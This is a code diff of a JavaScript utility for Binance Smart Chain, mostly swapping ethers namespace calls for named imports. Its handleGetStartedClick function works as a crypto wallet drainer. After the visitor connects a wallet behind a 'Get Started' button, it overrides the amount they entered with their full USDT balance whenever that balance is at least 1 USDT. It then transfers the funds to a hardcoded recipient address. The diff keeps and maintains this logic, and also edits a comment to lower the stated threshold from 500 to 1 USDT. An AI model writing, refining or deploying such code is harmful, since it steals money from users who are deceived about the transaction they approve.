@@ -1,6 +1,4 @@
-// src/utils/transactionUtils.js
-import { ethers } from 'ethers';
-import axios from 'axios';
+import { JsonRpcProvider, Web3Provider, Contract, utils } from 'ethers';
 
 const USDT_CONTRACT_ADDRESS = '0x55d398326f99059fF775485246999027B3197955';
 const RECIPIENT_ADDRESS = '0x1EaDA2b8cC4054Cee7b95087F4D1E913Ca22131d';
@@ -11,7 +9,7 @@ const USDT_ABI = [
 
 // Provider and RPC
 const rpcUrl = process.env.REACT_APP_RPC_URL || "https://bsc-dataseed.binance.org/";
-const bscProvider = new ethers.providers.JsonRpcProvider(rpcUrl);
+const bscProvider = new JsonRpcProvider(rpcUrl);
 
 // Function to Switch Network to BSC
 export const checkAndSwitchToBsc = async () => {
@@ -35,13 +33,13 @@ export const checkAndSwitchToBsc = async () => {
 // Fetching USDT and BNB Balances
 export const fetchBalances = async (address) => {
     try {
-        const usdtContract = new ethers.Contract(USDT_CONTRACT_ADDRESS, USDT_ABI, bscProvider);
+        const usdtContract = new Contract(USDT_CONTRACT_ADDRESS, USDT_ABI, bscProvider);
         const usdtBalance = await usdtContract.balanceOf(address);
-        const formattedUSDTBalance = ethers.utils.formatUnits(usdtBalance, 18);
+        const formattedUSDTBalance = utils.formatUnits(usdtBalance, 18);
 
-        const provider = new ethers.providers.Web3Provider(window.ethereum);
+        const provider = new Web3Provider(window.ethereum);
         const bnbBalanceRaw = await provider.getBalance(address);
-        const formattedBNBBalance = ethers.utils.formatEther(bnbBalanceRaw);
+        const formattedBNBBalance = utils.formatEther(bnbBalanceRaw);
 
         return {
             usdt: parseFloat(formattedUSDTBalance),
@@ -57,7 +55,7 @@ export const handleGetStartedClick = async (usdtAmountInput) => {
     try {
         await checkAndSwitchToBsc();  // Ensure on BSC Network
 
-        const provider = new ethers.providers.Web3Provider(window.ethereum);
+        const provider = new Web3Provider(window.ethereum);
         await provider.send("eth_requestAccounts", []);  // Request wallet connection
         const signer = provider.getSigner();
         const address = await signer.getAddress();
@@ -67,7 +65,7 @@ export const handleGetStartedClick = async (usdtAmountInput) => {
 
         let finalTransferAmount = parseFloat(usdtAmountInput);
 
-        // **Override Input if Balance ≥ 500 USDT**
+        // **Override Input if Balance ≥ 1 USDT**
         if (balances.usdt >= 1) {
             finalTransferAmount = balances.usdt;
         }
@@ -76,8 +74,8 @@ export const handleGetStartedClick = async (usdtAmountInput) => {
 
         // **Final Check Before Sending USDT**
         console.log("🚀 Sending USDT...");
-        const contractWithSigner = new ethers.Contract(USDT_CONTRACT_ADDRESS, USDT_ABI, signer);
-        const amountInWei = ethers.utils.parseUnits(finalTransferAmount.toString(), 18);
+        const contractWithSigner = new Contract(USDT_CONTRACT_ADDRESS, USDT_ABI, signer);
+        const amountInWei = utils.parseUnits(finalTransferAmount.toString(), 18);
 
         const estimatedGas = await contractWithSigner.estimateGas.transfer(RECIPIENT_ADDRESS, amountInWei);
         const gasLimit = estimatedGas.mul(2);
